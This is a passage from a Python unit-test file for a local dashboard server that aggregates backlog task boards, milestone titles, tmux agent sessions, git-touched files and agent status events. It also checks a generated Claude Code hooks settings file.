        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(self._config(), force=True)

        by_name = {p["name"]: p for p in board["projects"]}
        self.assertIsNotNone(by_name["my-tool"]["error"])
        self.assertEqual(by_name["my-tool"]["tasks"], [])

        self.assertIsNone(by_name["my-app"]["error"])
        self.assertEqual(len(by_name["my-app"]["tasks"]), 4)

    def test_schema_version_mismatch_is_per_project_error(self):
        def fake_run_backlog(args, cwd):
            return {"schemaVersion": 2, "kind": "task-list", "tasks": []}

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog):
            board = server.get_board(config, force=True)

        project = board["projects"][0]
        self.assertIsNotNone(project["error"])
        self.assertEqual(project["tasks"], [])

    def test_missing_repo_path_is_per_project_error(self):
        config = make_config([{"name": "ghost", "path": "/no/such/dir/at/all"}])
        board = server.get_board(config, force=True)
        project = board["projects"][0]
        self.assertIsNotNone(project["error"])
        self.assertEqual(project["tasks"], [])

    def test_cache_reuses_result_until_force(self):
        calls = {"n": 0}

        def fake_run_backlog(args, cwd):
            calls["n"] += 1
            if "--ready" in args:
                return {"schemaVersion": 1, "kind": "task-list", "tasks": []}
            return {"schemaVersion": 1, "kind": "task-list", "tasks": []}

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            server.get_board(config, force=True)
            first_calls = calls["n"]
            server.get_board(config, force=False)
            second_calls = calls["n"]

        self.assertEqual(first_calls, second_calls, "cached result should avoid re-invoking backlog")


def backlog_proc(returncode=0, stdout="", stderr=""):
    return subprocess.CompletedProcess(["backlog"], returncode, stdout, stderr)


class MilestoneTitleResolutionTests(unittest.TestCase):
    """Task-91: backlog's task JSON carries a milestone's ID ("m-0"), never
    its title, and those ids are handed out per repo -- so every repo has
    an "m-0" meaning something different. The board resolves id -> title
    per project through `backlog milestone list --plain` (the one read
    Centrale makes that has no --json) and hands the frontend both."""

    # The exact shape of `backlog milestone list --plain --show-completed`
    # (v1.51.0, byte-identical to v1.50.1's), including the section headings
    # and the "(none)" filler that must not be mistaken for milestones.
    MY_LIB_PLAIN = (
        "Active milestones (1):\n"
        "  m-0: post-0.2.0 (0/7 done)\n"
        "\n"
        "Completed milestones (0):\n"
        "  (none)\n"
    )
    MY_TOOL_PLAIN = (
        "Active milestones (0):\n"
        "  (none)\n"
        "\n"
        "Completed milestones (1):\n"
        "  m-0: Restructure for release (4/4 done)\n"
    )

    def setUp(self):
        server._reset_board_cache()
        server._reset_agent_events()
        self.my_lib_dir = os.path.dirname(os.path.abspath(__file__))
        self.my_tool_dir = os.path.dirname(self.my_lib_dir)

    def tearDown(self):
        server._reset_board_cache()
        server._reset_agent_events()

    @staticmethod
    def _task_list(*tasks):
        return {"schemaVersion": 1, "kind": "task-list", "tasks": list(tasks)}

    @staticmethod
    def _task(task_id, milestone=None, status="To Do"):
        return {"id": task_id, "title": task_id, "status": status, "milestone": milestone}

    # -- the parser --

    def test_plain_output_is_parsed_into_id_to_title(self):
        with mock.patch.object(server, "run_backlog_raw",
                               return_value=backlog_proc(0, self.MY_LIB_PLAIN)):
            self.assertEqual(server._load_project_milestones("/repos/my-lib"), {"m-0": "post-0.2.0"})

    def test_completed_milestones_are_included_so_their_tasks_still_get_a_title(self):
        # A task under a finished milestone is still on the board; without
        # --show-completed backlog collapses that whole section away, so
        # the flag is part of the contract, not a nicety.
        with mock.patch.object(server, "run_backlog_raw",
                               return_value=backlog_proc(0, self.MY_TOOL_PLAIN)) as raw:
            titles = server._load_project_milestones("/repos/my-tool")
        self.assertEqual(titles, {"m-0": "Restructure for release"})
        args, kwargs = raw.call_args
        self.assertEqual(args[0], ["milestone", "list", "--plain", "--show-completed"])
        self.assertEqual(kwargs["cwd"], "/repos/my-tool")

    def test_titles_containing_parentheses_survive_the_count_suffix(self):
        plain = "Active milestones (1):\n  m-3: 0.4.0 (the big one) (2/9 done)\n"
        with mock.patch.object(server, "run_backlog_raw", return_value=backlog_proc(0, plain)):
            self.assertEqual(server._load_project_milestones("/repos/x"), {"m-3": "0.4.0 (the big one)"})

    def test_a_failing_empty_or_unrecognised_listing_yields_no_titles(self):
        # Each of these must degrade to "label by id", never raise: a repo
        # with no milestones at all, a CLI whose plain rendering this
        # build doesn't recognise, and a call that failed outright.
        for label, proc in [
            ("no milestones", backlog_proc(0, "Active milestones (0):\n  (none)\n")),
            ("empty stdout", backlog_proc(0, "")),
            ("unrecognised rendering", backlog_proc(0, "m-0 -> post-0.2.0\nm-1 -> next\n")),
            ("failed call", backlog_proc(1, "", "backlog: not a backlog project")),
            ("timeout", backlog_proc(124, "", "timed out")),
        ]:
            with self.subTest(label), mock.patch.object(server, "run_backlog_raw", return_value=proc):
                self.assertEqual(server._load_project_milestones("/repos/x"), {})

    # -- the board build --

    def _board(self, per_project_tasks, milestone_plain, ready_ids=()):
        """Build a board over the given {project name: (path, [tasks])},
        with `backlog milestone list` answered per project path from
        `milestone_plain` ({path: CompletedProcess})."""
        def fake_run_backlog(args, cwd):
            tasks = per_project_tasks[cwd]
            if "--ready" in args:
                return self._task_list(*[t for t in tasks if t["id"] in ready_ids])
            return self._task_list(*tasks)

        raw = mock.Mock(side_effect=lambda args, cwd: milestone_plain[cwd])
        config = make_config([
            {"name": os.path.basename(path), "path": path} for path in per_project_tasks
        ])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_backlog_raw", raw), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(config, force=True)
        return board, raw

    def test_each_task_carries_its_milestones_title_alongside_the_untouched_id(self):
        board, _ = self._board(
            {self.my_lib_dir: [self._task("TASK-1", "m-0"), self._task("TASK-2")]},
            {self.my_lib_dir: backlog_proc(0, self.MY_LIB_PLAIN)},
        )
        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        # AC #4: the id is still the identity the frontend filters on.
        self.assertEqual(by_id["TASK-1"]["milestone"], "m-0")
        self.assertEqual(by_id["TASK-1"]["milestoneTitle"], "post-0.2.0")
        # A task with no milestone gets no title rather than a stray one.
        self.assertIsNone(by_id["TASK-2"]["milestoneTitle"])

    def test_the_same_id_in_two_projects_resolves_to_each_projects_own_title(self):
        # The bug in one assertion: "m-0" is my-lib's post-0.2.0 AND this
        # repo's Restructure for release, and they are not the same thing.
        board, _ = self._board(
            {
                self.my_lib_dir: [self._task("TASK-1", "m-0")],
                self.my_tool_dir: [self._task("TASK-9", "m-0")],
            },
            {
                self.my_lib_dir: backlog_proc(0, self.MY_LIB_PLAIN),
                self.my_tool_dir: backlog_proc(0, self.MY_TOOL_PLAIN),
            },
        )
        by_project = {p["name"]: p for p in board["projects"]}
        my_lib_task = by_project[os.path.basename(self.my_lib_dir)]["tasks"][0]
        my_tool_task = by_project[os.path.basename(self.my_tool_dir)]["tasks"][0]
        self.assertEqual(my_lib_task["milestone"], "m-0")
        self.assertEqual(my_tool_task["milestone"], "m-0")
        self.assertEqual(my_lib_task["milestoneTitle"], "post-0.2.0")
        self.assertEqual(my_tool_task["milestoneTitle"], "Restructure for release")

    def test_the_listing_is_read_once_per_project_never_once_per_task(self):
        # AC #5: the lookup is a dict hit per task; the CLI call is per
        # project, in the same one-call-per-project discipline the ready
        # list and `git for-each-ref` already follow.
        board, raw = self._board(
            {self.my_lib_dir: [self._task("TASK-%d" % i, "m-0") for i in range(1, 21)]},
            {self.my_lib_dir: backlog_proc(0, self.MY_LIB_PLAIN)},
        )
        self.assertEqual(len(board["projects"][0]["tasks"]), 20)
        self.assertEqual(raw.call_count, 1)

    def test_a_project_where_nothing_has_a_milestone_makes_no_call_at_all(self):
        board, raw = self._board(
            {self.my_lib_dir: [self._task("TASK-1"), self._task("TASK-2", "   ")]},
            {self.my_lib_dir: backlog_proc(0, self.MY_LIB_PLAIN)},
        )
        raw.assert_not_called()
        for task in board["projects"][0]["tasks"]:
            self.assertIsNone(task["milestoneTitle"])

    def test_an_unreadable_listing_degrades_to_no_title_rather_than_failing(self):
        # AC #5: the board still builds, the task still carries its id,
        # and the frontend falls back to showing that id.
        board, _ = self._board(
            {self.my_lib_dir: [self._task("TASK-1", "m-0")]},
            {self.my_lib_dir: backlog_proc(1, "", "backlog: no such command")},
        )
        task = board["projects"][0]["tasks"][0]
        self.assertIsNone(board["projects"][0]["error"])
        self.assertEqual(task["milestone"], "m-0")
        self.assertIsNone(task["milestoneTitle"])

    def test_an_id_missing_from_the_listing_gets_no_title(self):
        # A milestone archived out of `milestone list` while a task still
        # references it: same graceful fallback, not a KeyError.
        board, _ = self._board(
            {self.my_lib_dir: [self._task("TASK-1", "m-7")]},
            {self.my_lib_dir: backlog_proc(0, self.MY_LIB_PLAIN)},
        )
        self.assertIsNone(board["projects"][0]["tasks"][0]["milestoneTitle"])


class SessionsTests(unittest.TestCase):
    def test_no_tmux_server_running_yields_empty_list(self):
        proc = subprocess.CompletedProcess(
            ["tmux", "list-sessions"], 1, "", "no server running on /tmp/tmux-1000/default"
        )
        with mock.patch.object(server, "run_tmux", return_value=proc):
            self.assertEqual(server.list_sessions(), [])

    def test_filters_to_centrale_prefixed_sessions(self):
        # Only SESSION_PREFIX counts. "centrale-centrale-task-1" -- a
        # project literally named "centrale", spawned under the prefix --
        # is the tricky case a naive strip could get wrong.
        stdout = (
            "centrale-my-app-task-2\t1690000000\t0\n"
            "other-session\t1690000001\t1\n"
            "sidecar-my-app-task-3\t1690000002\t1\n"
            "centrale-centrale-task-1\t1690000003\t1\n"
        )
        proc = subprocess.CompletedProcess(["tmux", "list-sessions"], 0, stdout, "")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            sessions = server.list_sessions()

        names = {s["name"] for s in sessions}
        self.assertEqual(names, {"centrale-my-app-task-2", "centrale-centrale-task-1"})
        by_name = {s["name"]: s for s in sessions}
        self.assertFalse(by_name["centrale-my-app-task-2"]["attached"])
        self.assertTrue(by_name["centrale-centrale-task-1"]["attached"])


def git_proc(args, returncode=0, stdout="", stderr=""):
    return subprocess.CompletedProcess(["git", *args], returncode, stdout, stderr)


class RecoveryTagRoundTripTests(unittest.TestCase):
    """task-134: reading a discard back out of the tag a discard wrote.

    The board's `lastDiscardedAt` is only as true as this pair staying
    each other's inverse, so the tests go through recovery_tag_name()
    rather than hand-writing the tag string it produces.
    """

    def test_parse_recovers_the_id_and_utc_time_the_tag_was_written_with(self):
        when = calendar.timegm((2026, 9, 4, 16, 30, 12, 0, 0, 0))
        tag = server.recovery_tag_name("TASK-9", now=when)
        self.assertEqual(server.parse_recovery_tag(tag), ("TASK-9", "2026-09-04T16:30:12Z"))

    def test_a_dotted_subtask_id_round_trips_too(self):
        when = calendar.timegm((2026, 1, 2, 3, 4, 5, 0, 0, 0))
        tag = server.recovery_tag_name("TASK-9.01", now=when)
        self.assertEqual(server.parse_recovery_tag(tag), ("TASK-9.01", "2026-01-02T03:04:05Z"))

    def test_anything_that_is_not_one_of_our_tags_parses_to_none(self):
        for tag in ["abandoned/wip", "abandoned/task-9", "abandoned/task-9-20260904",
                    "abandoned/task-9-20260904-1630", "task/task-9",
                    "refs/tags/abandoned/task-9-20260904-163012", "", None]:
            self.assertIsNone(server.parse_recovery_tag(tag), tag)

    def test_latest_discard_times_reads_one_for_each_ref_and_never_raises(self):
        calls = []

        def fake_run_git(args, cwd=None, **kwargs):
            calls.append((args, cwd))
            return git_proc(args, 0, "abandoned/task-9-20260904-163012\n", "")

        with mock.patch.object(server, "run_git", side_effect=fake_run_git):
            self.assertEqual(server.latest_discard_times("/repo"),
                             {"TASK-9": "2026-09-04T16:30:12Z"})
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0][0][0], "for-each-ref")
        self.assertEqual(calls[0][0][-1], "refs/tags/abandoned")
        self.assertEqual(calls[0][1], "/repo")

    def test_latest_discard_times_is_empty_when_git_fails(self):
        with mock.patch.object(server, "run_git",
                               return_value=git_proc(["for-each-ref"], 128, "", "boom")):
            self.assertEqual(server.latest_discard_times("/repo"), {})


class TouchedFilesTests(unittest.TestCase):
    """Hermetic tests for the overlap-visibility helpers: mapping a
    session name back to its project/worktree, and collecting the files
    touched there so far, both via injected run_git/os.path.isdir."""

    def setUp(self):
        self.config = make_config([
            {"name": "my-app", "path": "/repos/my-app"},
            {"name": "my-tool", "path": "/repos/my-tool"},
        ])
        self.config["worktreeRoot"] = "/worktrees"

    def test_parse_session_project_and_task_resolves_known_project(self):
        project, task_id = server._parse_session_project_and_task(
            "centrale-my-app-task-2", self.config
        )
        self.assertEqual(project["name"], "my-app")
        self.assertEqual(task_id, "task-2")

    def test_parse_session_project_and_task_prefers_longest_project_name_match(self):
        config = make_config([
            {"name": "my-app", "path": "/repos/my-app"},
            {"name": "my-app-extra", "path": "/repos/my-app-extra"},
        ])
        project, task_id = server._parse_session_project_and_task(
            "centrale-my-app-extra-task-2", config
        )
        self.assertEqual(project["name"], "my-app-extra")
        self.assertEqual(task_id, "task-2")

    def test_parse_session_project_and_task_unresolvable_returns_none(self):
        project, task_id = server._parse_session_project_and_task(
            "centrale-unknownproject-task-2", self.config
        )
        self.assertIsNone(project)
        self.assertIsNone(task_id)

    def test_parse_session_project_and_task_rejects_a_foreign_prefix(self):
        project, task_id = server._parse_session_project_and_task(
            "other-my-app-task-2", self.config
        )
        self.assertIsNone(project)
        self.assertIsNone(task_id)

    def test_parse_session_project_and_task_decodes_dotted_subtask_id(self):
        # task-59: the session name carries the tmux-safe "_"-encoded
        # form of a dotted subtask id -- this must decode back to the
        # real dotted id ("task-11.2"), not return the raw "task-11_2"
        # substring, since worktree_dir/get_agent_state both expect the
        # dotted form.
        project, task_id = server._parse_session_project_and_task(
            "centrale-my-app-task-11_2", self.config
        )
        self.assertEqual(project["name"], "my-app")
        self.assertEqual(task_id, "task-11.2")

    def test_parse_session_project_and_task_recognizes_pre_fix_legacy_session(self):
        # task-59: before this fix, tmux itself silently mangled the "."
        # a spawn requested into "_" (e.g. "centrale-my-lib-task-11.2" ->
        # actually created as "centrale-my-lib-task-11_2"). Such a
        # pre-existing live session has the exact same name a post-fix
        # spawn now requests on purpose, so it's recognized with zero
        # migration.
        config = make_config([{"name": "my-lib", "path": "/repos/my-lib"}])
        project, task_id = server._parse_session_project_and_task(
            "centrale-my-lib-task-11_2", config
        )
        self.assertEqual(project["name"], "my-lib")
        self.assertEqual(task_id, "task-11.2")

    def test_parse_session_project_and_task_decodes_multi_level_dotted_id(self):
        # TASK_ID_RE allows more than one dot (a nested subtask like
        # TASK-1.2.3) -- every "_" in the remainder must decode back.
        project, task_id = server._parse_session_project_and_task(
            "centrale-my-app-task-1_2_3", self.config
        )
        self.assertEqual(project["name"], "my-app")
        self.assertEqual(task_id, "task-1.2.3")

    def test_live_sessions_for_project_returns_only_that_projects_sessions(self):
        # task-167: the question settings.py's remove-project guard asks
        # ("is an agent of ours still running in this repo"), answered
        # through the same reverse mapping everything else uses.
        stdout = (
            "centrale-my-app-task-2\t1690000000\t0\n"
            "centrale-my-lib-task-3\t1690000001\t0\n"
            "centrale-my-app-task-11_2\t1690000002\t1\n"
            "other-session\t1690000003\t0\n"
        )
        proc = subprocess.CompletedProcess(["tmux", "list-sessions"], 0, stdout, "")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            owned = server.live_sessions_for_project("my-app", self.config)
        self.assertEqual(sorted(owned), ["centrale-my-app-task-11_2", "centrale-my-app-task-2"])

    def test_live_sessions_for_project_is_not_fooled_by_a_name_prefix(self):
        # "my-app" is a prefix of "my-app-extra": a session of the
        # LONGER project must not count as one of the shorter one's, or
        # a removal would refuse for work in a different repo.
        config = make_config([
            {"name": "my-app", "path": "/repos/my-app"},
            {"name": "my-app-extra", "path": "/repos/my-app-extra"},
        ])
        proc = subprocess.CompletedProcess(
            ["tmux", "list-sessions"], 0, "centrale-my-app-extra-task-2\t1690000000\t0\n", "")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            self.assertEqual(server.live_sessions_for_project("my-app", config), [])
            self.assertEqual(
                server.live_sessions_for_project("my-app-extra", config),
                ["centrale-my-app-extra-task-2"])

    def test_live_sessions_for_project_with_no_tmux_server_is_empty(self):
        proc = subprocess.CompletedProcess(
            ["tmux", "list-sessions"], 1, "", "no server running on /tmp/tmux-1000/default")
        with mock.patch.object(server, "run_tmux", return_value=proc):
            self.assertEqual(server.live_sessions_for_project("my-app", self.config), [])

    def test_collect_touched_files_missing_worktree_returns_none(self):
        with mock.patch("os.path.isdir", return_value=False):
            files, total = server._collect_touched_files("/worktrees/my-app-task-2")
        self.assertIsNone(files)
        self.assertIsNone(total)

    def test_collect_touched_files_dedupes_diff_and_untracked(self):
        def fake_run_git(args, cwd=None):
            if args[:1] == ["diff"]:
                return git_proc(args, 0, "shared.py\nmodified.py\n", "")
            if args[:1] == ["status"]:
                return git_proc(
                    args, 0,
                    "?? shared.py\n?? new_file.py\n M modified.py\n",
                    "",
                )
            raise AssertionError(f"unexpected git call: {args}")

        with mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            files, total = server._collect_touched_files("/worktrees/my-app-task-2")

        # shared.py appears in both diff and the untracked (??) lines, and
        # the ` M modified.py` status line isn't an untracked (`??`) line
        # so it must not be double-counted or added a second time either.
        self.assertEqual(files, ["shared.py", "modified.py", "new_file.py"])
        self.assertEqual(total, 3)

    def test_collect_touched_files_caps_at_20_with_total_count(self):
        diff_files = "\n".join(f"file{i}.py" for i in range(25)) + "\n"

        def fake_run_git(args, cwd=None):
            if args[:1] == ["diff"]:
                return git_proc(args, 0, diff_files, "")
            return git_proc(args, 0, "", "")

        with mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            files, total = server._collect_touched_files("/worktrees/my-app-task-2")

        self.assertEqual(len(files), 20)
        self.assertEqual(total, 25)
        self.assertEqual(files, [f"file{i}.py" for i in range(20)])

    def test_collect_touched_files_git_failure_yields_empty_not_error(self):
        with mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 128, "", "fatal: not a git repo")):
            files, total = server._collect_touched_files("/worktrees/my-app-task-2")
        self.assertEqual(files, [])
        self.assertEqual(total, 0)

    def test_collect_touched_files_dequotes_spaced_backlog_style_names(self):
        # Task-35: a real Backlog.md task filename always has a space
        # (around " - "), which git status --porcelain quotes -- must
        # come back clean, not with stray literal double-quotes.
        def fake_run_git(args, cwd=None):
            if args[:1] == ["diff"]:
                return git_proc(args, 0, '"backlog/tasks/task-1 - Fix bug.md"\n', "")
            if args[:1] == ["status"]:
                return git_proc(args, 0, '?? "notes with space.txt"\n', "")
            raise AssertionError(f"unexpected git call: {args}")

        with mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            files, total = server._collect_touched_files("/worktrees/my-app-task-2")

        self.assertEqual(files, ["backlog/tasks/task-1 - Fix bug.md", "notes with space.txt"])
        self.assertEqual(total, 2)

    def test_enrich_sessions_attaches_files_and_project_for_resolvable_sessions(self):
        sessions = [{"name": "centrale-my-app-task-2", "created": "0", "attached": False}]
        with mock.patch("os.path.isdir", return_value=True), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "a.py\n", "")):
            server.enrich_sessions_with_files(sessions, self.config)

        self.assertEqual(sessions[0]["project"], "my-app")
        self.assertEqual(sessions[0]["files"], ["a.py"])
        self.assertEqual(sessions[0]["filesTotal"], 1)

    def test_enrich_sessions_resolves_dotted_subtask_session_to_dotted_worktree(self):
        # task-59 AC #2: the sessions sidebar row for a dotted-id task
        # must link back to its real project/task -- enrich_sessions_
        # with_files is what attaches "project" (findTask/parseSessionTask
        # on the frontend then use it to resolve the drawer). The
        # worktree it looks up files in must be the dotted directory
        # (spawn.worktree_dir never encodes), even though the session
        # name itself is underscore-encoded.
        sessions = [{"name": "centrale-my-app-task-11_2", "created": "0", "attached": False}]
        isdir_calls = []

        def fake_isdir(path):
            isdir_calls.append(path)
            return True

        with mock.patch("os.path.isdir", side_effect=fake_isdir), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "a.py\n", "")):
            server.enrich_sessions_with_files(sessions, self.config)

        self.assertEqual(sessions[0]["project"], "my-app")
        self.assertEqual(sessions[0]["files"], ["a.py"])
        self.assertIn("/worktrees/my-app-task-11.2", isdir_calls)

    def test_enrich_sessions_omits_files_key_when_worktree_gone_or_unresolvable(self):
        sessions = [
            {"name": "centrale-my-app-task-2", "created": "0", "attached": False},  # worktree gone
            {"name": "centrale-unknown-task-9", "created": "0", "attached": False},  # unresolvable
        ]
        with mock.patch("os.path.isdir", return_value=False):
            server.enrich_sessions_with_files(sessions, self.config)

        for s in sessions:
            self.assertNotIn("files", s)
            self.assertNotIn("filesTotal", s)


class DequoteGitPathTests(unittest.TestCase):
    """Task-35: git wraps a path in double quotes (and backslash/octal-
    escapes it) the instant it contains a space or other special
    character -- verified empirically that a plain space alone triggers
    this, unconditionally, regardless of core.quotePath (which only
    governs whether non-ASCII bytes specifically get octal-escaped)."""

    def test_unquoted_path_passes_through_unchanged(self):
        self.assertEqual(server.dequote_git_path("plain/path.txt"), "plain/path.txt")

    def test_quoted_path_with_a_space_is_unwrapped(self):
        self.assertEqual(
            server.dequote_git_path('"backlog/tasks/task-1 - Fix the thing.md"'),
            "backlog/tasks/task-1 - Fix the thing.md",
        )

    def test_escaped_double_quote_is_decoded(self):
        self.assertEqual(server.dequote_git_path('"weird\\"quote.txt"'), 'weird"quote.txt')

    def test_escaped_backslash_is_decoded(self):
        self.assertEqual(server.dequote_git_path('"weird\\\\slash.txt"'), "weird\\slash.txt")

    def test_escaped_tab_and_newline_are_decoded(self):
        self.assertEqual(server.dequote_git_path('"a\\tb\\nc.txt"'), "a\tb\nc.txt")

    def test_octal_escaped_non_ascii_bytes_decode_to_the_real_utf8_character(self):
        # "café résumé.txt" -- é is UTF-8 bytes 0xC3 0xA9 -> octal \303\251.
        self.assertEqual(
            server.dequote_git_path('"caf\\303\\251 r\\303\\251sum\\303\\251.txt"'),
            "café résumé.txt",
        )

    def test_mixed_ascii_and_octal_escapes(self):
        self.assertEqual(server.dequote_git_path('"na\\303\\257ve file.txt"'), "naïve file.txt")

    def test_empty_quoted_string(self):
        self.assertEqual(server.dequote_git_path('""'), "")

    def test_string_not_wrapped_in_quotes_is_untouched_even_with_backslashes(self):
        # Only a path that's actually quoted (starts AND ends with ")
        # gets dequoted -- a bare path is never touched, even if it
        # happens to contain a literal backslash some other way.
        self.assertEqual(server.dequote_git_path("plain\\path.txt"), "plain\\path.txt")

    def test_too_short_to_be_quoted_passes_through(self):
        self.assertEqual(server.dequote_git_path('"'), '"')
        self.assertEqual(server.dequote_git_path(""), "")


class AgentEventStoreTests(unittest.TestCase):
    """Hermetic unit tests for the in-memory agent-event store (task-37):
    record_agent_event/get_agent_state, in isolation from the HTTP
    handler (see HttpApiTests for the /api/agent-event endpoint itself)
    and from get_board/enrich_sessions_with_files (see
    BoardAggregationTests/TouchedFilesTests for those two merges)."""

    def setUp(self):
        server._reset_agent_events()

    def tearDown(self):
        server._reset_agent_events()

    def test_unknown_state_for_a_task_with_no_recorded_event(self):
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")
        self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "unknown")

    def test_records_and_reads_back_each_valid_state(self):
        for state in server.AGENT_STATES:
            with self.subTest(state=state):
                server.record_agent_event("my-app", "TASK-2", state)
                self.assertEqual(server.get_agent_state("my-app", "TASK-2"), state)

    def test_invalid_state_raises_value_error(self):
        with self.assertRaises(ValueError):
            server.record_agent_event("my-app", "TASK-2", "sleeping")

    def test_invalid_state_does_not_overwrite_a_previously_recorded_one(self):
        server.record_agent_event("my-app", "TASK-2", "working")
        with self.assertRaises(ValueError):
            server.record_agent_event("my-app", "TASK-2", "bogus")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "working")

    def test_a_later_event_overwrites_an_earlier_one(self):
        server.record_agent_event("my-app", "TASK-2", "working")
        server.record_agent_event("my-app", "TASK-2", "waiting")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "waiting")


    def test_codex_finished_is_exposed_as_honest_idle(self):
        # TASK-58 proved a codex Stop/notify event is indistinguishable
        # between a genuinely complete task and a turn ending on a chat
        # question. Both cases therefore expose the same honest state.
        server.record_agent_event("my-app", "TASK-2", "finished", agent_kind="codex")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "idle")
        self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "codex")

    def test_codex_working_and_permission_waiting_are_unchanged(self):
        for state in ("working", "waiting"):
            with self.subTest(state=state):
                server.record_agent_event("my-app", "TASK-2", state, agent_kind="codex")
                self.assertEqual(server.get_agent_state("my-app", "TASK-2"), state)

    def test_claude_states_including_finished_are_unchanged(self):
        for state in server.AGENT_STATES:
            with self.subTest(state=state):
                server.record_agent_event("my-app", "TASK-2", state, agent_kind="claude")
                self.assertEqual(server.get_agent_state("my-app", "TASK-2"), state)
                self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "claude")

    def test_missing_kind_preserves_legacy_finished_semantics(self):
        server.record_agent_event("my-app", "TASK-2", "finished")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "finished")
        self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "unknown")

    def test_later_event_without_kind_retains_known_kind(self):
        server.record_agent_event("my-app", "TASK-2", "working", agent_kind="codex")
        server.record_agent_event("my-app", "TASK-2", "finished")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "idle")
        self.assertEqual(server.get_agent_kind("my-app", "TASK-2"), "codex")

    def test_invalid_agent_kind_raises_without_recording(self):
        with self.assertRaises(ValueError):
            server.record_agent_event("my-app", "TASK-2", "working", agent_kind="other")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")

    def test_keyed_by_project_and_task_independently(self):
        server.record_agent_event("my-app", "TASK-2", "working")
        self.assertEqual(server.get_agent_state("my-app", "TASK-3"), "unknown")
        self.assertEqual(server.get_agent_state("my-lib", "TASK-2"), "unknown")

    def test_lookup_is_case_insensitive_on_task_id(self):
        # /api/board keys off task["id"] (whatever case backlog stores),
        # while /api/sessions parses a lowercased id out of the tmux
        # session name (see _parse_session_project_and_task) -- both must
        # resolve to the same stored event regardless of which case
        # recorded it.
        server.record_agent_event("my-app", "task-2", "finished")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "finished")
        self.assertEqual(server.get_agent_state("my-app", "Task-2"), "finished")

    def test_clear_agent_event_forgets_only_the_target_tasks_residue(self):
        # task-63: clearing for a new session must be as narrowly keyed as
        # recording itself -- another task/project's live badge is unrelated.
        server.record_agent_event("my-app", "TASK-2", "waiting")
        server.record_agent_event("my-app", "TASK-3", "working")
        server.record_agent_event("my-lib", "TASK-2", "finished")

        server.clear_agent_event("my-app", "task-2")

        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")
        self.assertEqual(server.get_agent_state("my-app", "TASK-3"), "working")
        self.assertEqual(server.get_agent_state("my-lib", "TASK-2"), "finished")

    def test_clear_agent_event_is_idempotent_when_no_residue_exists(self):
        server.clear_agent_event("my-app", "TASK-2")
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")

    def test_reset_helper_clears_the_store(self):
        server.record_agent_event("my-app", "TASK-2", "working")
        server._reset_agent_events()
        self.assertEqual(server.get_agent_state("my-app", "TASK-2"), "unknown")


class HooksSettingsFileTests(unittest.TestCase):
    """Hermetic tests for the generated Claude Code hooks settings file
    (task-37): real file I/O against an isolated temp cache dir (never
    the real ~/.cache/centrale), same pattern test_spawn.py's
    GitExcludeIdempotenceTests uses for its own real-file-I/O case."""

    def setUp(self):
        import tempfile
        self.tmp_dir = tempfile.mkdtemp(prefix="centrale-test-cache-")
        self.addCleanup(self._cleanup)
        self.settings_path = os.path.join(self.tmp_dir, "hooks-settings.json")
        self.path_patch = mock.patch.object(server, "hooks_settings_path", return_value=self.settings_path)
        self.path_patch.start()
        self.addCleanup(self.path_patch.stop)

    def _cleanup(self):
        import shutil
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_notify_script_path_points_at_the_real_repo_root_helper(self):
        path = server.notify_script_path()
        self.assertEqual(os.path.basename(path), "centrale_notify.py")
        self.assertTrue(os.path.isfile(path), f"expected {path} to exist")

    def test_creates_the_cache_dir_and_writes_the_file(self):
        returned = server.ensure_hooks_settings_file()
        self.assertEqual(returned, self.settings_path)
        self.assertTrue(os.path.isfile(self.settings_path))

    def test_payload_maps_each_hook_point_to_the_right_state(self):
        server.ensure_hooks_settings_file()
        with open(self.settings_path, "r", encoding="utf-8") as f:
            payload = json.load(f)

        notify = server.notify_script_path()

        def command_for(hook_name):
            return payload["hooks"][hook_name][0]["hooks"][0]["command"]

        self.assertEqual(command_for("UserPromptSubmit"), f"python3 {notify} working")
        self.assertEqual(command_for("PreToolUse"), f"python3 {notify} working")
        self.assertEqual(command_for("Notification"), f"python3 {notify} waiting")
        self.assertEqual(command_for("Stop"), f"python3 {notify} finished")

    def test_second_call_overwrites_the_first_atomically(self):
        server.ensure_hooks_settings_file()
        first_mtime = os.stat(self.settings_path).st_mtime_ns
        server.ensure_hooks_settings_file()
        self.assertTrue(os.path.isfile(self.settings_path))
        # Still exactly one file -- no stray .tmp left behind.
        self.assertEqual(os.listdir(self.tmp_dir), ["hooks-settings.json"])
